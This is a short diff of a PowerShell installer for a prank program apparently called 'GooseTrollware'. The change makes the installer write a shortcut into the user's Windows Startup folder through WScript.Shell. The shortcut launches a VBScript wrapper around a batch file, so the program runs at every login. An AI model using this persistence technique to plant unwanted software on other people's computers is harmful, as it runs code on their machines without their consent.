@@ -5,7 +5,13 @@ Expand-Archive -Path "GooseTrollware.zip" -DestinationPath "GooseTrollware" -For
 
 $gloc="GooseTrollware\GooseTrollwareLegit.bat"
 
-cp "GooseTrollware\GooseTrollwareLegit.lnk" "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.lnk")
+$Shortcut.TargetPath = "$home\GooseTrollware\GooseTrollwareLegit.vbs"
+$Shortcut.Arguments = "$home\GooseTrollware\GooseTrollwareLegit.bat"
+$Shortcut.Save()
+
+# cp "GooseTrollware\GooseTrollwareLegit.lnk" "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 # And finally we start it
 Start-Sleep 1
